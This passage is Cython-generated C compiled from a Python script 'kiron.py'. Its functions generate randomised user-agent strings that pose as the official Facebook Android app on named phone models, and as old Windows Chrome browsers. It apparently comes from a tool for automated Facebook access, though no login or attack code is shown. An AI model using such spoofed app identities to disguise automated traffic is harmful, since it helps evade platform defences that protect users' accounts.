 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M1803E1A;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
 *         return ua
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_7AYYUB_M1(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_7AYYUB_M1 = {"AYYUB_M1", (PyCFunction)__pyx_pw_5kiron_7AYYUB_M1, METH_NOARGS, 0};
static PyObject *__pyx_pw_5kiron_7AYYUB_M1(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("AYYUB_M1 (wrapper)", 0);
  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  __pyx_r = __pyx_pf_5kiron_6AYYUB_M1(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_6AYYUB_M1(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("AYYUB_M1", 1);

  /* "kiron.py":134
 * #__________________[ M1 ]__________________#
 * def AYYUB_M1():
 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M1803E1A;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"             # <<<<<<<<<<<<<<
 *         return ua
 * #__________________[ M2 ]__________________#
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_randint); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_kp_s_FBAN_FB4A_FBAV, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_kp_s_0_0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_randrange); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_randint); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_3, __pyx_kp_s_FBBV); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_randint); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_kp_s_FBAN_FB4A_FBAV_59_0_0_15_313_FB); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_ua = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":135
 * def AYYUB_M1():
 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M1803E1A;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
 *         return ua             # <<<<<<<<<<<<<<
 * #__________________[ M2 ]__________________#
 * def AYYUB_M2():
 */
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_v_ua);
  __pyx_r = __pyx_v_ua;
  goto __pyx_L0;

  /* "kiron.py":133
 * def linex():print(f'\x1b[1;97m\033[1;37m')
 * #__________________[ M1 ]__________________#
 * def AYYUB_M1():             # <<<<<<<<<<<<<<
 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M1803E1A;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
 *         return ua
 */

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("kiron.AYYUB_M1", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":137
 *         return ua
 * #__________________[ M2 ]__________________#
 * def AYYUB_M2():             # <<<<<<<<<<<<<<
 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ZS630KL;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]"
 *         return ua
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_9AYYUB_M2(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_9AYYUB_M2 = {"AYYUB_M2", (PyCFunction)__pyx_pw_5kiron_9AYYUB_M2, METH_NOARGS, 0};
static PyObject *__pyx_pw_5kiron_9AYYUB_M2(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("AYYUB_M2 (wrapper)", 0);
  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  __pyx_r = __pyx_pf_5kiron_8AYYUB_M2(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_8AYYUB_M2(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("AYYUB_M2", 1);

  /* "kiron.py":138
 * #__________________[ M2 ]__________________#
 * def AYYUB_M2():
 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ZS630KL;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]"             # <<<<<<<<<<<<<<
 *         return ua
 * #-----------------------[ UA-CODE ]-----------------------#
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_randint); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_kp_s_FBAN_FB4A_FBAV, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_kp_s_0_0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_randrange); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_randint); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_3, __pyx_kp_s_FBBV); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_randint); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_kp_s_FBAN_FB4A_FBAV_59_0_0_15_313_FB_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 138, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_ua = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":139
 * def AYYUB_M2():
 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ZS630KL;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]"
 *         return ua             # <<<<<<<<<<<<<<
 * #-----------------------[ UA-CODE ]-----------------------#
 * #old ua def[]
 */
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_v_ua);
  __pyx_r = __pyx_v_ua;
  goto __pyx_L0;

  /* "kiron.py":137
 *         return ua
 * #__________________[ M2 ]__________________#
 * def AYYUB_M2():             # <<<<<<<<<<<<<<
 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ZS630KL;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]"
 *         return ua
 */

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("kiron.AYYUB_M2", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":142
 * #-----------------------[ UA-CODE ]-----------------------#
 * #old ua def[]
 * def windows():             # <<<<<<<<<<<<<<
 *     aV=str(random.choice(range(10,20)))
 *     A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_11windows(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_11windows = {"windows", (PyCFunction)__pyx_pw_5kiron_11windows, METH_NOARGS, 0};
static PyObject *__pyx_pw_5kiron_11windows(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("windows (wrapper)", 0);
  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  __pyx_r = __pyx_pf_5kiron_10windows(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_10windows(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_aV = NULL;
  PyObject *__pyx_v_A = NULL;
  PyObject *__pyx_v_bV = NULL;
  PyObject *__pyx_v_bx = NULL;
  PyObject *__pyx_v_bz = NULL;
  PyObject *__pyx_v_B = NULL;
  PyObject *__pyx_v_cV = NULL;
  PyObject *__pyx_v_cx = NULL;
  PyObject *__pyx_v_cz = NULL;
  PyObject *__pyx_v_C = NULL;
  PyObject *__pyx_v_D = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_t_5;
  Py_ssize_t __pyx_t_6;
  Py_UCS4 __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("windows", 1);

  /* "kiron.py":143
 * #old ua def[]
 * def windows():
 *     aV=str(random.choice(range(10,20)))             # <<<<<<<<<<<<<<
 *     A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
 *     bV=str(random.choice(range(1,36)))
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 143, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 143, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__5, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 143, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 143, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 143, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_aV = __pyx_t_3;
  __pyx_t_3 = 0;

  /* "kiron.py":144
 * def windows():
 *     aV=str(random.choice(range(10,20)))
 *     A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"             # <<<<<<<<<<<<<<
 *     bV=str(random.choice(range(1,36)))
 *     bx=str(random.choice(range(34,38)))
 */
  __pyx_t_3 = PyTuple_New(10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_Mozilla_5_0_Windows_U_Windows_NT);
  __pyx_t_6 += 36;
  __Pyx_GIVEREF(__pyx_kp_u_Mozilla_5_0_Windows_U_Windows_NT);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_Mozilla_5_0_Windows_U_Windows_NT);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__6, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
